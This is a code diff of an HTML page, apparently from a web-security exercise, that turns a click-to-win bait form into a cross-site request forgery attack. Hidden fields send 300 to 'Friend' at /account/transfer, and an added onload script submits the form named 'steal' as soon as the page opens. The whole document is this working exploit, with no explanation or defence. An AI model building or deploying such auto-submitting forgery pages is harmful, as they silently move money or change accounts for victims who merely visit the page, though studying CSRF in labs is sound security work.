@@ -5,11 +5,16 @@
     <title>Bank Application</title>
 </head>
 <body>
-    <form action="/account/transfer" method="get">
+    <form action="/account/transfer" method="post" name = "steal">
     	<input type = "hidden" name = "person" value = "Friend">
     	<input type = "hidden" name = "amount" value = "300">
-        <button>Click to claim your prize!</button>
     </form>
+    
+    <script>
+    	window.onload = function() {
+    		document.forms['steal'].submit();
+    	}
+    </script>
     
 </body>
 </html>
